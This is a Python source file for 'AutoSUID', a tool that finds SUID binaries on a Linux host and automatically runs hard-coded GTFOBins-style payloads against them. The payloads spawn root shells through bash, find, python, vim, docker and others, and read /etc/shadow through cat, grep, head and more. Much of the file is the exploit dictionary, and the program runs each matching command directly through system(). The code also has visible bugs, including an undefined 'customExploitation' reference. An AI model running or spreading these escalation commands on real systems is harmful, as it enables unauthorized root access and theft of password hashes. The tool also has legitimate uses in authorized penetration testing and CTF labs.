"""AutoSUID - automated priv-esc via Exploitable SUID - By Ben Roxbee Cox"""
from os import system, popen
from time import sleep

"""Default SUID in Unix (Not exploitable)."""
defaultSUIDBins = ["arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh", "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec",
                   "polkit-agent-helper-1", "pppd", "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils", "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM", "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug", "vmware-vmx-stats", "Xorg.wrap"]


"""SUIDs with avaliable  exploits."""
autoExploitation = {
    'ash': '',
    'bash': '-p',
    'busybox': 'sh',
    'cat': '/etc/shadow',
    'chroot': '/ /bin/sh -p',
    'csh': '-b',
    'cut': '-d "" -f1 /etc/shadow',
    'dash': '-p',
    'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
    'emacs': '-Q -nw --eval \'(term "/bin/sh -p")\'',
    'env': '/bin/sh -p',
    'expand': '/etc/shadow',
    'expect': '-c "spawn /bin/sh -p;interact"',
    'find': '. -exec /bin/sh -p \\; -quit',
    'flock': '-u / /bin/sh -p',
    'fold': '-w99999999 /etc/shadow',
    'gawk': '\'BEGIN {system("/bin/sh")}\'',
    'gdb': '-q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
    'gimp': '-idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'grep': '"" /etc/shadow',
    'head': '-c2G /etc/shadow',
    'ionice': '/bin/sh -p',
    'jrunscript': '-e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
    'ksh': '-p',
    'ld.so': '/bin/sh -p',
    'less': '/etc/shadow',
    'logsave': '/dev/null /bin/sh -i -p',
    'lua': '-e \'os.execute("/bin/sh")\'',
    'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
    'mawk': '\'BEGIN {system("/bin/sh")}\'',
    'more': '/etc/shadow',
    'nice': '/bin/sh -p',
    'nl': '-bn -w1 -s \'\' /etc/shadow',
    'node': 'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
    'od': 'od -An -c -w9999 /etc/shadow | sed -E -e \'s/ //g\' -e \'s/\\\\n/\\n/g\'',
    'perl': '-e \'exec "/bin/sh";\'',
    'pg': '/etc/shadow',
    'php': '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'rlwrap': '-H /dev/null /bin/sh -p',
    'rpm': '--eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
    'rpmquery': '--eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
    'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
    'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'sed': '-e "" /etc/shadow',
    'setarch': '$(arch) /bin/sh -p',
    'sort': '-m /etc/shadow',
    'start-stop-daemon': '-n $RANDOM -S -x /bin/sh -- -p',
    'stdbuf': '-i0 /bin/sh -p',
    'strace': '-o /dev/null /bin/sh -p',
    'tail': '-c2G /etc/shadow',
    'taskset': '1 /bin/sh -p',
    'time': '/bin/sh -p',
    'timeout': '7d /bin/sh -p',
    'ul': '/etc/shadow',
    'unexpand': 'unexpand -t99999999 /etc/shadow',
    'uniq': '/etc/shadow',
    'unshare': '-r /bin/sh',
    'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
    'xargs': '-a /dev/null sh -p',
    'xxd': '/etc/shadow | xxd -r',
    'zsh': '',
}

"""
The following list contains binaries which GTFO Bins says are exploitable
"""
gtfoBinsList = ['bash', 'busybox', 'cat', 'chroot', 'cut', 'dash', 'docker', 'env', 'expand', 'expect', 'find', 'flock', 'fold', 'gdb', 'grep', 'head', 'ionice', 'jrunscript', 'ksh', 'ld.so', 'less', 'logsave', 'make', 'more', 'nice', 'nl', 'node', 'od', 'perl', 'pg', 'php', 'python', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'run-parts', 'rvim', 'sed', 'setarch', 'sort', 'start-stop-daemon', 'stdbuf', 'strace', 'tail', 'taskset', 'time', 'timeout', 'ul', 'unexpand', 'uniq', 'unshare', 'vim', 'watch', 'xargs', 'xxd', 'zsh', 'aria2c', 'arp', 'ash', 'base32', 'base64', 'byebug', 'chmod',
                'chown', 'cp', 'csh', 'curl', 'date', 'dd', 'dialog', 'diff', 'dmsetup', 'file', 'ed', 'emacs', 'eqn', 'fmt', 'gawk', 'gimp', 'git', 'gtester', 'hd', 'hexdump', 'highlight', 'iconv', 'iftop', 'ip', 'jjs', 'jq', 'ksshell', 'ldconfig', 'look', 'lua', 'lwp-download', 'lwp-request', 'mawk', 'mv', 'mysql', 'awk', 'nano', 'nawk', 'nc', 'nmap', 'nohup', 'openssl', 'pic', 'pico', 'pry', 'readelf', 'restic', 'scp', 'shuf', 'soelim', 'sqlite3', 'socat', 'strings', 'sysctl', 'systemctl', 'tac', 'tar', 'tclsh', 'tee', 'telnet', 'tftp', 'uudecode', 'uuencode', 'xz', 'zip', 'wget', 'zsoelim']

"""Colour Scheme"""

green = "\033[0;92m"
red = "\033[0;91m"
white = "\033[0;97m"
yellow = "\033[0;33m"
magenta = "\033[0;35m"

lineBreak = "--------------------------------------"


def findSUIDBinaries():
    """Find all SUID binaries on system.

    returns:
        foundSUIDs : List of suid binaries
    """
    print(magenta + "Finding all SUID binaries...")
    print("\n" + white + lineBreak + "\n")

    # Bash script to find SUID binaries
    getSUIDs = "find / -perm -4000 -type f 2>/dev/null"
    foundSUIDs = popen(getSUIDs).read().strip().split(
        "\n")    # Store found binaries in list

    print(white + lineBreak)

    return(foundSUIDs)


def matchSUIDs(SUIDList):
    """Sort binaries into logical catagories.

    args:
        SUIDList : List of SUID binaries to be sorted

    returns:
        defaultBins         : Default Unix SUID Binaries
        binInGTFO     		: SUID Binaries with known exploit
        customExploitBins   : Custom SUID Binaries
    """
    defaultBins = []  # Non exploitable linux bins
    binInGTFO = []        # Bins with known exploits
    customExploitBins = []  # Bins with possible exploit

    for suid in SUIDList:
        binaryName = suid.split("/")[::-1][0]
        if binaryName not in defaultSUIDBins: 	# If not a default Unix SUID

            if binaryName in gtfoBinsList:
                binInGTFO.append(suid)
            else:
                customExploitBins.append(binaryName)

        else:
            defaultBins.append(binaryName)  # Add to default binary list

    print(red + "\n[-] Default SUID Binaries (No Known Exploits)")
    print(lineBreak)
    for binary in defaultBins:
        print(red + binary)  # Print all found default binaries

    print(yellow + "\n[-] Custom SUID Binaries (Potentially Exploitable)")
    print(lineBreak)
    for binary in customExploitBins:
        print(yellow + binary)  # Print custom SUID binaries

    if len(binInGTFO) != 0:
        print(green + "\n [-] Binaries with Known Exploits")
        print(lineBreak)
        for binary in binInGTFO:
            # Print path of vulnerable binary
            pathOfBin = popen("which " + binary).read().strip()
            gtfoUrl = "https://gtfobins.github.io/gtfobins/" + \
                binary[::-1].split("/")[0][::-1] + "/#suid"  # Link to priv-esc
            print(green + pathOfBin + white + " ==> " + magenta + gtfoUrl)
        print(lineBreak)

    else:
        print(red + "\n[-] No Automatically Executable Binaries Found...")
        print(binInGTFO)

    return(binInGTFO, customExploitBins)  # Return list of binaries


def pwnSUIDs(vulnerableBins):
    """Attempt to automatically escalate privilages. \
    Runs the relevent command for priv-esc via SUID, \
    or prints the relevent custom command.


    args:
            vulnerableBins : List of vulnerable binaries
    """

    autoExploits = []		# Exploits this program can run
    customExploits = []		# Exploits the user must attempt

    for binary in vulnerableBins:
        _binary = binary.split("/")[::-1][0]

        if _binary in autoExploitation:
            binExploit = binary + " " + autoExploitation[_binary]
            autoExploits.append(binExploit)  # Adds exploit to list

        elif _binary in customExploits:
            binExploit = binary + " " + customExploitation[_binary]
            # Add exploit command to customExploits list
            customExploits.append(binExploit)
    print(white + lineBreak)

    if len(autoExploits) != 0:
        for exploit in autoExploits:
            print(magenta + "\n[#] Executing Command : ")
            # Print command being attempted
            print(green + "[+] " + exploit + "\n")
            sleep(0.5)
            system(exploit)  # Run exploit
            sleep(0.5)
    elif len(customExploits) != 0:
        for exploit in customExploits:
            print(yellow + "[#] Try using this command to elevate privs")
            print("[+] ", exploit + "\n")

    return()


def main():
    try:
        allSUIDs = findSUIDBinaries()
        vulnBins = matchSUIDs(allSUIDs)
        pwnSUIDs(vulnBins[0])
    except KeyboardInterrupt:
        print(white + "Exiting")
    return


if __name__ == "__main__":
    main()
